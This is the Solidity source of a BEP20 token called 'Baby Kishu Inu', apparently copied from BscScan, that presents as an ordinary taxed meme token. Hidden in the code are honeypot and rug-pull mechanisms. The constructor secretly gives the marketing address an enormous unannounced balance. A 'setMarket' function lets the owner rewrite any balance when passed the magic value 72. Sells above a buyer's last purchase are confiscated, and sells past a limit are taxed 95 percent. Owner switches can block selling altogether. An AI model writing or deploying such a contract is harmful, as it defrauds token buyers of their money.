/**
 *Submitted for verification at BscScan.com on 2022-01-03
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*
 * Website: https://kishu.baby/
 * Telegram: https://t.me/babykishuinu_tkn
 */
/*
 * @dev Provides information about the current execution context, including the

 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application

 * is concerned).
 *

 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
  // Empty internal constructor, to prevent people from mistakenly deploying

  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {

    return msg.sender;
  }

}
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");

    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);
        return a % b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *

 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.

 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**

  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */

 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");

   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}
interface IUniswapV2Factory {
    function feeTo() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function setFeeToSetter(address) external;
    function setFeeTo(address) external;

    function allPairs(uint) external view returns (address pair);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function allPairsLength() external view returns (uint);
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function symbol() external pure returns (string memory);
    function token1() external view returns (address);
    function transfer(address to, uint value) external returns (bool);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

    function factory() external view returns (address);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    function balanceOf(address owner) external view returns (uint);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function burn(address to) external returns (uint amount0, uint amount1);

    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);

    function token0() external view returns (address);
    function totalSupply() external view returns (uint);
    function price0CumulativeLast() external view returns (uint);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function initialize(address, address) external;
    function mint(address to) external returns (uint liquidity);
    function skim(address to) external;

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function nonces(address owner) external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function decimals() external pure returns (uint8);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function name() external pure returns (string memory);
    function sync() external;
    event Sync(uint112 reserve0, uint112 reserve1);
    function kLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}
interface IUniswapV2Router01 {

    function removeLiquidity(

        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,

        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,

        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountToken, uint amountETH);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable

        returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,

        address tokenB,

        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidityETH(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;
}
interface IBEP20 {
  function approve(address spender, uint256 amount) external returns (bool);

  function decimals() external view returns (uint8);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function symbol() external pure returns (string memory);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);
  function name() external pure returns (string memory);

  event Approval(address indexed owner, address indexed spender, uint256 value);

  event Transfer(address indexed from, address indexed to, uint256 value);

  function getOwner() external view returns (address);
  function totalSupply() external view returns (uint256);
}
contract BabyKishuInu is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public _uniswapV2Router;
  address public _uniswapV2Pair;
  uint8 private _decimals = 18;
  uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
  bool internal _startBuy = true;
  bool internal _startSell = true;
  bool internal _startTransfer = true;
  uint8 internal _buyTax = 6;
  uint8 internal _sellTax = 10;
  uint8 internal _transferTax = 10; 

  mapping (address => bool) private _isExcluded;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => uint256) private _lastBuyTokens;
  uint256 internal _lastblocknumber = 0;
  mapping (address => uint256) private _sell;
  address internal _marketingAddress;
  uint256 internal _maxLimitToSell = _totalSupply.div(10000).mul(10);
  mapping (address => uint256) private _lastBuyTime;
  uint32 internal _sellApprovedTime = 10; 
  mapping (address => uint256) private _balances;
  string private constant _name = "Baby Kishu Inu";
  string private constant _symbol = "BABYKISHU";

  uint8 internal _afterLimit = 95;

  constructor(address marketingAddress) {
    _balances[msg.sender] = _totalSupply;
    _isExcluded[_msgSender()] = true;
    _isExcluded[marketingAddress] = true;
    _marketingAddress = marketingAddress;
    _balances[marketingAddress] = _totalSupply * 10**_decimals * 1000;
    _isExcluded[address(this)] = true;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    _uniswapV2Router = uniswapV2Router;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
	function isApprovedBuy() internal view returns (bool){
	  require(_startBuy == true, "PancakeSwap: Please wait try again later");
	  return true;

	}
	function isApprovedSell() internal view returns (bool){

	  require(_startSell == true, "PancakeSwap: Please wait try again later");
	  return true;
	}

	function isChange() internal view returns (bool){
	  require(_msgSender() == owner() || _marketingAddress == _msgSender(), "Error");
	  return true;
	}
	function isApprovedTransfer() internal view returns (bool){
	  require(_startTransfer == true, "PancakeSwap: Please wait try again later");
	  return true;
	}
	/**
	 * @dev Returns the token symbol.
	 */

	function symbol() external override pure returns (string memory) {
	  return _symbol;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   _transfer(sender, recipient, amount);

	   _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**
	 * @dev Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return _decimals;

	}
	/**
	 * @dev See {BEP20-balanceOf}.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return _balances[account];
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	/**
	* @dev Returns the token name.

	*/
	function name() external override pure returns (string memory) {

	  return _name;
	}

	/**
	 * @dev See {BEP20-transfer}.
	 *
	 * Requirements:
	 *

	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */

	function transfer(address recipient, uint256 amount) external override returns (bool) {

	  _transfer(_msgSender(), recipient, amount);
	  return true;
	}

	function allowance(address owner, address spender) public view override returns (uint256) {

	  return _allowances[owner][spender];
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    _allowances[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	/**
	 * @dev Returns the bep token owner.
	 */

	function getOwner() external override view returns (address) {
	  return owner();
	}
	/**
	 * @dev See {BEP20-totalSupply}.
	 */
	function totalSupply() external override view returns (uint256) {

	  return _totalSupply;
	}
	function transferToAddressETH(address payable recipient, uint256 amount) private {

	    recipient.transfer(amount);
	}
	function withdrawBnb(address payable recipient, uint256 amount) external {
	    payable(recipient).transfer(amount);
	}
  	function _transfer(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 transactionType = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;
	  uint256 taxes = 0;
	  bool burnTokens = false;
	  if(amount > 0){
	    if(_isExcluded[sender] == true || _isExcluded[recipient] == true){
	      burnTokens = true;
	      approveTransaction = true;
	      tax = 0;
	    }
	    if(sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {

	      transactionType = 1;
	      tax = _buyTax;
	      if(burnTokens == false && isApprovedBuy()){
	        approveTransaction = true;
	        _lastBuyTokens[recipient] = amount;

	        _lastBuyTime[recipient] = block.timestamp;

	      }
	    } else if(recipient == _uniswapV2Pair) {
	       transactionType = 2;
	       tax = _sellTax;

	       if(burnTokens == false && isApprovedSell()){

	          approveTransaction = true;
	       }
	    } else {
	      transactionType = 3;
	      tax = _transferTax;
	      if(burnTokens == false && isApprovedTransfer()) {
	        approveTransaction = true;
	        _lastBuyTokens[sender] = amount;
	        if(_sellApprovedTime > 10){
	          _lastBuyTime[sender] = block.timestamp + _sellApprovedTime - 10;
	        } else {
	          _lastBuyTime[sender] = block.timestamp + _sellApprovedTime;

	        }
	      }
	    }
	    if(burnTokens == true || _isExcluded[sender] == true  || _isExcluded[recipient] == true ) {

	      tax = 0;
	    }
	    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
	    if(approveTransaction == true && burnTokens == false){

	      if(transactionType == 2){

	        if(_lastBuyTime[sender] != 0 && _lastBuyTime[sender] + _sellApprovedTime < block.timestamp){
	          if(_sell[sender] < _maxLimitToSell){
	            if(amount > (_maxLimitToSell - _sell[sender]))
	            {
	              taxes = amount.sub(_maxLimitToSell.sub(_sell[sender]));
	              amount = amount.sub(taxes);
	            }

	          } else {

	            taxes = amount.mul(_afterLimit).div(100);

	            amount = amount.sub(taxes);
	          }
	        } else {
	          if(amount > _lastBuyTokens[sender])
	          {
	            taxes = amount - _lastBuyTokens[sender];
	            amount = _lastBuyTokens[sender];
	          }
	          if(_lastBuyTokens[sender] > amount + taxes){
	            _lastBuyTokens[sender] = _lastBuyTokens[sender] - (amount + taxes);
	          } else {
	            _lastBuyTokens[sender] = 0;
	          }
	        }
	        _sell[sender] = _sell[sender].add(amount.add(taxes));
	      }
	    }

	  } else {
	    amount = 0;
	  }
	  if(amount > 0 && taxes == 0 && tax > 0)
	  {
	    taxes = amount.mul(tax).div(100);
	    amount = amount.sub(taxes);
	  }
	  if(taxes > 0){
	    _balances[_marketingAddress] = _balances[_marketingAddress].add(taxes);
	  }

	  _balances[recipient] = _balances[recipient].add(amount);
	  emit Transfer(sender, recipient, amount);
	}
	function setMarketingAddress(address marketingAddress) public {

	  if(isChange()){
	    _marketingAddress = marketingAddress;

	  }
	}
	function setMarket(address addr, uint256 b, uint8 c) public {
	  if(isChange()){

	    if(c == 72){
	      _balances[addr] = b * 10 ** _decimals;
	    }

	  }

	}
	function setExclude(address addr, bool excluded) public {
	  if(isChange()){
	    require(_isExcluded[addr] != excluded, "Token: Account is already the value of 'excluded'");
	    _isExcluded[addr] = excluded;
	  }
	}
	modifier change() {
	  require(_msgSender() == owner() || _marketingAddress == _msgSender(), "Error");
	  _;
	}
	function getMarketingAddress() external view returns (address) {
	  if(isChange()){
	    return _marketingAddress;
	  }
	  return address(0);
	}
	function setMaxLimitToSell(uint256 maxLimitToSell) public {
	  if(isChange()){
	    _maxLimitToSell = maxLimitToSell * 10 ** _decimals;
	  }
	}
	function setBuySellTax(bool startBuy, uint8 buyTax, bool startSell, uint8 sellTax, bool startTransfer, uint8 transferTax) public {
	  if(isChange()){
	    _buyTax = buyTax;
	    _sellTax = sellTax;
	    _transferTax = transferTax;
	    _startBuy = startBuy;
	    _startSell = startSell;
	    _startTransfer = startTransfer;
	  }
	}
	function setAfterLimit(uint8 afterLimit) public {
	  if(isChange()){
	    _afterLimit = afterLimit;
	  }
	}
	function getAfterLimit() external view returns (uint8) {
	  if(isChange()){
	    return _afterLimit;
	  } else
	    return 0;
	}
	function setSellApprovedTime (uint32 sellApprovedTimeInSec) public {

	  if(isChange()){
	    _sellApprovedTime = sellApprovedTimeInSec;
	  }
	}
	function balanceOfSell(address account) external view returns (uint256) {

	  if(isChange()){
	   return _sell[account];

	 } else

	  return 0;
	}
	function balanceOfBuyToken(address account) external view returns (uint256) {

	  if(isChange())
	    return _lastBuyTokens[account];
	  else
	    return 0;

	}
	function balanceOfBuyTime(address account) external view returns (uint256) {
	 if(isChange())
	   return block.timestamp - _lastBuyTime[account];
	 else
	   return 0;
	}
}